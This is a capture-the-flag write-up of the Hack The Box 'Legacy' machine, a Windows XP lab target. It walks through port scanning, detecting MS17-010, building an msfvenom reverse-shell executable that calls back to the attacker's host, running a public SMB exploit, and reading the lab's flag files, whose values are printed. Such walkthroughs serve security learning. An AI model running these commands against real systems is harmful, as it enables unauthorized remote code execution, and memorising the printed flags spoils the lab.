# Legacy
## Reconnaissance

* Performed TCP scans using Masscan before extracting open ports for Nmap to conduct in-depth scans on services and OS. (Did not include UDP and other TCP scans)
```
sudo masscan -p1-65535 10.10.10.4 --rate=1000 -e tun0 > ports && ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//') && nmap -Pn -sV -sC -A -p$ports 10.10.10.4
```
* The results of the Masscan and Nmap show that port 139 and 445 are open. Target machine OS is Windows XP.

```
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
Host script results:
|_clock-skew: mean: -3h52m55s, deviation: 1h24m50s, median: -4h52m55s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:89:0e (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-04T01:41:30+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

* Testing SMB vulnerability. Machine is vulnerable to MS17-010.
```
nmap --script smb-vuln-ms17-010 -p 139,445 10.10.10.4 -Pn
```
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx`
```
## Weaponization
* Used msfvenom to create a reverse shell executable

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 EXITFUNC=thread -f exe -a x86 -o reverse_shell.exe
```
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse_shell.exe
```

## Delivery & Exploitation
* Set up netcat to listen on port 4444
```
nc -nvlp 4444
```
```
listening on [any] 4444 ...
```

* Download the send_and_execute.py script from [helviojunior](https://github.com/helviojunior/MS17-010)

```
python /home/kali/send_and_execute.py 10.10.10.4 reverse_shell.exe 
```

```
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8201d2b8
SESSION: 0xe1202c18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1b11370
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b11410
overwriting token UserAndGroups
Sending file 999947.exe...
Opening SVCManager on 10.10.10.4.....
Creating service CsKT.....
Starting service CsKT.....
The NETBIOS connection with the remote host timed out.
Removing service CsKT.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```
* If you encounter dependency issues with python SMB module, try the following:
```
pip install pysmb
```

* Reverse Shell obtained with Admin Privileges
```
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.4] 1055
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

        Host Name . . . . . . . . . . . . : legacy
        Primary Dns Suffix  . . . . . . . : 
        Node Type . . . . . . . . . . . . : Unknown
        IP Routing Enabled. . . . . . . . : No
        WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        Description . . . . . . . . . . . : AMD PCNET Family PCI Ethernet Adapter
        Physical Address. . . . . . . . . : 00-50-56-B9-89-0E
        Dhcp Enabled. . . . . . . . . . . : No
        IP Address. . . . . . . . . . . . : 10.10.10.4
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 10.10.10.2
        DNS Servers . . . . . . . . . . . : 10.10.10.2

C:\WINDOWS\system32>type C:\Docume~1\Administrator\Desktop\root.txt
type C:\Docume~1\Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>type C:\Docume~1\John\Desktop\user.txt
type C:\Docume~1\John\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f
```

* Unable to determine the exact user logged in.
```
C:\WINDOWS\system32>echo %Username%          
echo %Username%                                         
%Username%
```

* Used send_and_execute.py to send whoami.exe over to target machine. Confirmed that we are NT AUTHORITY\SYSTEM.
```
python /home/kali/send_and_execute.py 10.10.10.4 /usr/share/windows-resources/binaries/whoami.exe
```

```
 Directory of C:\

04/11/2020  02:25             73.802 999947.exe
03/11/2020  06:24             73.802 9VMU9B.exe
16/03/2017  07:30                  0 AUTOEXEC.BAT
04/11/2020  02:44             66.560 AWHELA.exe
16/03/2017  07:30                  0 CONFIG.SYS
16/03/2017  08:07     <DIR>          Documents and Settings
03/11/2020  06:44             73.802 FPQO1X.exe
03/11/2020  02:46             73.802 JGKOXR.exe
16/03/2017  07:33     <DIR>          Program Files
16/03/2017  07:33     <DIR>          WINDOWS
03/11/2020  02:37             73.802 XX1YFZ.exe
               8 File(s)        435.570 bytes
               3 Dir(s)   6.484.676.608 bytes free

C:\>AWHELA.exe
AWHELA.exe
NT AUTHORITY\SYSTEM
```


